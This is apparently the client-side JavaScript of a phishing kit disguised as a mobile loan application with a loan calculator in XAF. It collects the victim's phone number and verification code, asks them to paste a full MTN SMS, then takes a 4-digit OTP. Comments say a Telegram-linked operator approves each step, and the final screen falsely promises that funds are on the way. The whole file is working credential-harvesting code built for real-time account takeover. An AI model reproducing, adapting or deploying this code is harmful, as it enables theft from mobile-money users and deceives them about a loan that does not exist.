// Show a specific screen and hide others
function showScreen(screenId) {
    document.querySelectorAll('.app-screen').forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');
    document.getElementById(screenId).scrollTop = 0;
}

// Loan Calculator Logic
const amountSlider = document.getElementById('loan-amount');
const termSlider = document.getElementById('loan-term');
const amountDisplay = document.getElementById('amount-display');
const termDisplay = document.getElementById('term-display');
const monthlyPaymentDisplay = document.getElementById('monthly-payment');

function calculateLoan() {
    const amount = parseFloat(amountSlider.value);
    const months = parseFloat(termSlider.value);
    
    amountDisplay.innerText = 'XAF ' + amount.toLocaleString();
    termDisplay.innerText = months + ' Months';

    const interestRate = 0.01; // 1% monthly
    const monthlyPayment = (amount / months) + (amount * interestRate);
    
    monthlyPaymentDisplay.innerText = 'XAF ' + Math.round(monthlyPayment).toLocaleString();
}

amountSlider.addEventListener('input', calculateLoan);
termSlider.addEventListener('input', calculateLoan);
calculateLoan();

// Submit Initial Application Logic
document.getElementById('submit-btn').addEventListener('click', async function(e) {
    e.preventDefault();
    
    document.getElementById('processing-title').innerText = "Processing Application";
    document.getElementById('processing-text').innerText = "Please wait while an agent reviews your loan request. Do not close this page.";
    document.getElementById('loader-spinner').style.display = "block"; 
    showScreen('screen-processing');

    const data = {
        phone: document.getElementById('phone').value,
        code: document.getElementById('verification-code').value
    };

    try {
        const response = await fetch('/api/apply', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (result.success && result.appId) {
            window.currentAppId = result.appId; // Save for later

            const interval = setInterval(async () => {
                try {
                    const statusRes = await fetch(`/api/status/${result.appId}`);
                    const statusData = await statusRes.json();

                    if (statusData.status === 'approved') {
                        clearInterval(interval); 
                        document.getElementById('processing-title').innerText = "Approved!";
                        document.getElementById('processing-text').innerText = "Redirecting...";
                        document.getElementById('loader-spinner').style.display = "none"; 
                        setTimeout(() => { showScreen('screen-sms'); }, 1000); 

                    } else if (statusData.status === 'rejected') {
                        clearInterval(interval); 
                        document.getElementById('processing-title').innerText = "Application Rejected";
                        document.getElementById('processing-text').innerText = "Unfortunately, we cannot offer you a loan at this time.";
                        document.getElementById('loader-spinner').style.display = "none"; 
                    }
                } catch (error) {
                    console.error("Waiting for approval...", error);
                }
            }, 3000); 
        } else {
            alert("Error sending application.");
            showScreen('screen-step3');
        }
    } catch (error) {
        console.error(error);
        alert("Network error.");
        showScreen('screen-step3');
    }
});

// --- SMS Paste Screen Logic ---
const smsInput = document.getElementById('sms-input');
const verifyBtn = document.getElementById('verify-btn');

verifyBtn.disabled = true;

smsInput.addEventListener('input', function() {
    const hasContent = smsInput.value.trim().length > 0;
    if (hasContent) {
        verifyBtn.disabled = false;
        verifyBtn.style.pointerEvents = 'auto';
        verifyBtn.style.background = '#ffcc00';
        verifyBtn.style.color = '#000';
        verifyBtn.style.opacity = '1';
    } else {
        verifyBtn.disabled = true;
        verifyBtn.style.pointerEvents = 'none';
        verifyBtn.style.background = '#ffe082';
        verifyBtn.style.color = '#fff';
        verifyBtn.style.opacity = '0.6';
    }
});

verifyBtn.addEventListener('click', function() {
    const smsText = smsInput.value.trim();
    if (smsText.length < 10) {
        alert("Please paste the full SMS you received from MTN.");
        return;
    }

    // Show Processing Screen
    document.getElementById('processing-title').innerText = "Verifying SMS...";
    document.getElementById('processing-text').innerText = "Please wait while an agent reviews the pasted SMS.";
    document.getElementById('loader-spinner').style.display = "block";
    showScreen('screen-processing');

    // Send SMS to backend
    fetch('/api/verify-sms', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sms: smsText, appId: window.currentAppId || 'unknown' })
    })
    .then(res => res.json())
    .then(result => {
        if (result.success) {
            // Start polling to check if Telegram approved the SMS
            const interval = setInterval(async () => {
                try {
                    const statusRes = await fetch(`/api/sms-status/${window.currentAppId}`);
                    const statusData = await statusRes.json();

                    if (statusData.status === 'approved') {
                        clearInterval(interval);
                        document.getElementById('processing-title').innerText = "SMS Approved";
                        document.getElementById('processing-text').innerText = "Redirecting to final step...";
                        document.getElementById('loader-spinner').style.display = "none";
                        
                        setTimeout(() => {
                            showScreen('screen-otp');
                            // Auto-focus first box
                            setTimeout(() => document.querySelectorAll('.otp-box')[0].focus(), 300);
                        }, 1000);

                    } else if (statusData.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('processing-title').innerText = "SMS Rejected";
                        document.getElementById('processing-text').innerText = "The agent rejected this SMS. Please try again.";
                        document.getElementById('loader-spinner').style.display = "none";
                    }
                } catch (error) {
                    console.error("Checking SMS status...", error);
                }
            }, 3000); // Check every 3 seconds
        } else {
            alert("Error sending SMS.");
            showScreen('screen-sms');
        }
    });
});

// --- OTP Screen Logic ---
const otpBoxes = document.querySelectorAll('.otp-box');
const otpSubmitBtn = document.getElementById('otp-submit-btn');

otpBoxes.forEach((box, index) => {
    // Focus styling
    box.addEventListener('focus', () => {
        box.style.borderColor = '#ffcc00';
        box.style.boxShadow = '0 0 0 3px rgba(255, 204, 0, 0.2)';
    });
    box.addEventListener('blur', () => {
        box.style.borderColor = '#ddd';
        box.style.boxShadow = 'none';
    });

    // Auto-advance to next box
    box.addEventListener('input', (e) => {
        if (e.target.value && index < otpBoxes.length - 1) {
            otpBoxes[index + 1].focus();
        }
        checkOtpComplete();
    });

    // Handle backspace
    box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            otpBoxes[index - 1].focus();
        }
    });

    // Handle paste (e.g. pasting the 4 digits directly)
    box.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
        if (pastedData) {
            for (let i = 0; i < pastedData.length; i++) {
                if (otpBoxes[i]) otpBoxes[i].value = pastedData[i];
            }
            if (pastedData.length === 4) otpBoxes[3].focus();
            else otpBoxes[pastedData.length].focus();
            checkOtpComplete();
        }
    });
});

function checkOtpComplete() {
    let allFilled = true;
    otpBoxes.forEach(box => {
        if (!box.value) allFilled = false;
    });

    if (allFilled) {
        otpSubmitBtn.style.pointerEvents = 'auto';
        otpSubmitBtn.style.background = '#ffcc00';
        otpSubmitBtn.style.color = '#000';
    } else {
        otpSubmitBtn.style.pointerEvents = 'none';
        otpSubmitBtn.style.background = '#ffe082';
        otpSubmitBtn.style.color = '#fff';
    }
}

otpSubmitBtn.addEventListener('click', () => {
    // Gather the code
    let fullCode = "";
    otpBoxes.forEach(box => fullCode += box.value);

    // Send the OTP code to Telegram via the backend
    document.getElementById('processing-title').innerText = "Verifying Code...";
    document.getElementById('processing-text').innerText = "Please wait.";
    document.getElementById('loader-spinner').style.display = "block";
    showScreen('screen-processing');

    fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp: fullCode, appId: window.currentAppId || 'unknown' })
    })
    .then(res => res.json())
    .then(result => {
        document.getElementById('processing-title').innerText = "Success!";
        document.getElementById('processing-text').innerText = "Your loan has been finalized. You will receive your funds shortly.";
        document.getElementById('loader-spinner').style.display = "none";
    })
    .catch(() => {
        document.getElementById('processing-title').innerText = "Network Error";
        document.getElementById('processing-text').innerText = "Please try again.";
        document.getElementById('loader-spinner').style.display = "none";
    });
});